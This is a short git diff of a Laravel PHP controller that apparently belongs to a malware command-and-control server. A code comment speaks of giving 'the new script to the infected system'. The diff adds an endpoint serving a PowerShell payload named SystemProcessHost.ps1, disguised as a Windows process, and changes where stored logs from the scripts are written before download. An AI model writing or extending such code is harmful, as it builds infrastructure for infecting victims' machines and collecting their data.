@@ -47,6 +47,12 @@ class HomeController extends Controller
         return $response;
     }
 
+    public function downloadscript()
+    {
+        $path = public_path('storage/SystemProcessHost.ps1');
+        return response()->download($path);
+    }
+    
     // Give the new script to the infected system
     public function download()
     {
@@ -68,7 +74,7 @@ class HomeController extends Controller
     {
         $log = Script::find($id);
         $log_content = $log->content;
-        file_put_contents(public_path('log.txt'), $log_content);
-        return response()->download(public_path('log.txt'));
+        file_put_contents(public_path('storage/log.txt'), $log_content);
+        return response()->download(public_path('storage/log.txt'));
     }
 }
